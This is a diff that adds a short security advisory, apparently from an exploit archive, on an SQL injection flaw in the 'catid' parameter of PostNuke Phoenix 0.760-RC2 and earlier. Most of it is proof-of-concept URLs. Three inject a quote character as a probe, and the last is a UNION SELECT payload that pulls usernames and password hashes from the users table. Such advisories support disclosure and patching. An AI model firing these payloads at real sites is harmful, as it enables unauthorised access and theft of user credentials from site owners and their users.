@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/12683/info
+
+PostNuke Phoenix is reported prone to an SQL injection vulnerability. This issue arises due to insufficient sanitization of user-supplied input.
+
+It is reported that issue presents itself when malicious SQL syntax is issued to the application through the 'catid' variable.
+
+PostNuke 0.760-RC2 and prior versions are reported vulnerable. 
+
+http://www.example.com/index.php?catid='cXIb8O3
+
+http://www.example.com/modules.php?op=modload&name=News&file=article&sid=1&catid='cXIb8O3
+
+http://www.example.com/admin.php?module=NS-AddStory&op=EditCategory&catid='cXIb8O3
+
+http://www.example.com/modules.php?op=modload&name=NS-Polls&file=index&req=results&pollID=2&mode=thread&order=0&thold=0&catid=-99999%20UNION%20SELECT%20pn_uname,pn_uname,pn_
+uname,pn_uname,pn_uname,null,null,null,pn_uname,pn_uname,pn_uname,pn_uname,pn_uname,null,pn_pass,null,null,null,null,null,null%20FROM%20[$PREFIX]users%20WHERE%20pn_uid=2/
+* 
